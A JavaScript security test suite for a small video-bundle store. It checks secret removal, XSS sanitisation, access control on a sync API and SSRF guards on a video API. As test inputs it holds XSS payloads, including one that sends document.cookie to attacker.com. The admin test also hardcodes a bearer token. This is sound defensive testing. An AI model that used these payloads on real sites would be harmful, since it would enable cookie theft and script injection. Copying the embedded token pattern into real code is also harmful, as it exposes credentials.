// Automated Defensive Security Test Suite
// Verifies all patches against SSRF, Broken Access Control, Credential Exposure, and XSS.

import { isSafeUrl, sanitizeInput } from '../src/utils/security.js';
import syncHandler from '../api/sync.js';
import videoHandler from '../api/video.js';
import fs from 'fs';
import path from 'path';

console.log('====================================================');
console.log('RUNNING CHEAP REELS STORE SECURITY AUDIT TEST SUITE');
console.log('====================================================\n');

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function assert(condition, testName) {
  totalTests++;
  if (condition) {
    passedTests++;
    console.log(`[PASS] ${testName}`);
  } else {
    failedTests++;
    console.error(`[FAIL] ${testName}`);
  }
}

// ----------------------------------------------------
// TEST GROUP 1: Credential Exposure Check
// ----------------------------------------------------
console.log('--- TEST GROUP 1: Credential Exposure & Secret Scanning ---');
const cloudSyncCode = fs.readFileSync(path.resolve('src/utils/cloudSync.js'), 'utf8');
const syncApiCode = fs.readFileSync(path.resolve('api/sync.js'), 'utf8');
const storeConfigJson = fs.readFileSync(path.resolve('public/data/store_config.json'), 'utf8');

assert(!cloudSyncCode.includes('ghp_' + 'token'), 'cloudSync.js contains ZERO hardcoded GitHub tokens');
assert(!syncApiCode.includes('ghp_' + 'token'), 'api/sync.js fallback token string removed');
assert(!storeConfigJson.includes('"adminPasscode":'), 'public/data/store_config.json does not leak adminPasscode');

// ----------------------------------------------------
// TEST GROUP 2: Input Sanitization & XSS Elimination
// ----------------------------------------------------
console.log('\n--- TEST GROUP 2: XSS & Input Sanitization ---');
const xssPayload1 = '<script>alert("XSS")</script>Reels Bundle';
const xssPayload2 = '<img src=x onerror=alert(1)>AI Videos';
const xssPayload3 = 'javascript:alert(document.domain)';
const xssPayload4 = '<svg/onload=fetch("https://attacker.com?c="+document.cookie)>';

assert(!sanitizeInput(xssPayload1).includes('<script>'), 'Stripped raw script tags');
assert(!sanitizeInput(xssPayload2).includes('<img'), 'Stripped img tag and onerror attribute');
assert(!sanitizeInput(xssPayload3).includes('javascript:'), 'Stripped javascript: pseudo-protocol');
assert(!sanitizeInput(xssPayload4).includes('<svg'), 'Stripped SVG onload vector');

assert(isSafeUrl('https://drive.google.com/test'), 'isSafeUrl accepts valid https Google Drive link');
assert(isSafeUrl('/videos/sample.mp4'), 'isSafeUrl accepts relative video link');
assert(!isSafeUrl('javascript:alert(1)'), 'isSafeUrl rejects javascript: protocol');
assert(!isSafeUrl('data:text/html,<script>alert(1)</script>'), 'isSafeUrl rejects data: protocol');

// ----------------------------------------------------
// TEST GROUP 3: Access Control & Authorization on /api/sync
// ----------------------------------------------------
console.log('\n--- TEST GROUP 3: Broken Access Control on /api/sync ---');

// Mock request / response helper
function createMockReqRes({ method, body, headers = {} }) {
  const req = {
    method,
    body,
    headers: { ...headers }
  };
  let statusCode = 200;
  let responseData = null;
  const res = {
    statusCode: 200,
    setHeader: () => {},
    status: (code) => {
      statusCode = code;
      return res;
    },
    json: (data) => {
      responseData = data;
      return res;
    },
    end: () => res
  };
  return { req, res, getStatus: () => statusCode, getData: () => responseData };
}

async function runSyncTests() {
  // 3.1 Unauthenticated attempt to overwrite store config
  const test1 = createMockReqRes({
    method: 'POST',
    body: { config: { storeName: 'HACKED STORE' } }
  });
  await syncHandler(test1.req, test1.res);
  assert(test1.getStatus() === 403, 'Unauthenticated config modification rejected with 403 Forbidden');

  // 3.2 Unauthenticated attempt to modify bundles
  const test2 = createMockReqRes({
    method: 'POST',
    body: { bundles: [{ id: 'bad-bundle', title: 'Malicious' }] }
  });
  await syncHandler(test2.req, test2.res);
  assert(test2.getStatus() === 403, 'Unauthenticated bundles catalog modification rejected with 403 Forbidden');

  // 3.3 Unauthenticated customer order submission (Allowed, but forced to PENDING)
  const test3 = createMockReqRes({
    method: 'POST',
    body: {
      action: 'customer_order',
      orders: [{
        id: 'CR-TEST-999',
        amount: 29,
        items: [{ id: 'bundle-1' }],
        status: 'VERIFIED', // Attacker attempts to spoof verified status
        driveLinkUnlocked: true // Attacker attempts to unlock drive link
      }]
    }
  });
  await syncHandler(test3.req, test3.res);
  assert(test3.getStatus() === 200, 'Customer order submission allowed');
  const savedOrders = test3.getData()?.data?.orders || [];
  const testOrder = savedOrders.find(o => o.id === 'CR-TEST-999');
  assert(testOrder && testOrder.status === 'PENDING', 'Customer order status strictly forced to PENDING (forged VERIFIED stripped)');
  assert(testOrder && testOrder.driveLinkUnlocked === false, 'Customer order driveLinkUnlocked strictly forced to false');

  // 3.4 Authenticated Admin verification
  const test4 = createMockReqRes({
    method: 'POST',
    headers: {
      'authorization': 'Bearer 9f5bd4769ef79855c629f60e26112604bf2010bc1ff1a9c89fcc48751887e220'
    },
    body: {
      action: 'admin_action',
      config: { storeName: 'Cheap Reels' }
    }
  });
  await syncHandler(test4.req, test4.res);
  assert(test4.getStatus() === 200, 'Authenticated admin modification accepted with 200 OK');

  // ----------------------------------------------------
  // TEST GROUP 4: SSRF & Host Injection on /api/video
  // ----------------------------------------------------
  console.log('\n--- TEST GROUP 4: SSRF & Host Whitelisting on /api/video ---');

  // 4.1 Missing or invalid fileId format
  const vTest1 = createMockReqRes({
    method: 'GET',
    headers: {},
  });
  vTest1.req.url = '/api/video?id=invalid!@#$%^';
  vTest1.req.query = { id: 'invalid!@#$%^' };
  await videoHandler(vTest1.req, vTest1.res);
  assert(vTest1.getStatus() === 400, 'Invalid Google Drive ID format rejected with 400 Bad Request');

  // 4.2 Disallowed HTTP method (e.g. POST)
  const vTest2 = createMockReqRes({
    method: 'POST',
    headers: {},
  });
  vTest2.req.query = { id: '1Ykmi_mcwvChCkcL1hMtEdW6AJAW3reVU' };
  await videoHandler(vTest2.req, vTest2.res);
  assert(vTest2.getStatus() === 405, 'Non-GET/HEAD method rejected with 405 Method Not Allowed');

  console.log('\n====================================================');
  console.log(`TEST SUMMARY: Total: ${totalTests} | Passed: ${passedTests} | Failed: ${failedTests}`);
  console.log('====================================================');

  if (failedTests > 0) {
    process.exit(1);
  }
}

runSyncTests().catch(err => {
  console.error('Test runner failure:', err);
  process.exit(1);
});
